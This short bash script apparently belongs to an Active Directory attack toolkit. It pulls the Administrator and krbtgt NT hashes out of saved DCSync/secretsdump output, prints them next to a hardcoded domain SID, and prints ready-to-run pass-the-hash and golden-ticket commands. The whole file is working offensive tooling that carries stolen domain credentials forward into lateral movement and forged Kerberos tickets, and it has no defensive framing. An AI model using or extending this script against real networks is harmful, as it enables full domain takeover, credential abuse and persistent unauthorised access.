#!/bin/bash
# Helper: Extract NT hashes from secretsdump output
# Usage: ./dcsync.sh 2>&1 | tee /tmp/dcsync_out.txt && ./extract_hashes.sh

DCSYNC_OUTPUT="/tmp/dcsync_out.txt"

echo "[*] Extracting hashes from DCSync output..."

ADMIN_HASH=$(grep -i "^Administrator:" $DCSYNC_OUTPUT | cut -d: -f4)
KRBTGT_HASH=$(grep -i "^krbtgt:" $DCSYNC_OUTPUT | cut -d: -f4)

echo ""
echo "===== EXTRACTED HASHES ====="
echo "Administrator NT Hash : $ADMIN_HASH"
echo "krbtgt NT Hash        : $KRBTGT_HASH"
echo "Domain SID            : S-1-5-21-1513106177-3543149454-2722361769"
echo ""
echo "===== READY-TO-RUN COMMANDS ====="
echo ""
echo "# Pass-the-Hash:"
echo "./pass_the_hash.sh $ADMIN_HASH"
echo ""
echo "# Golden Ticket:"
echo "./golden_ticket.sh $KRBTGT_HASH S-1-5-21-1513106177-3543149454-2722361769"
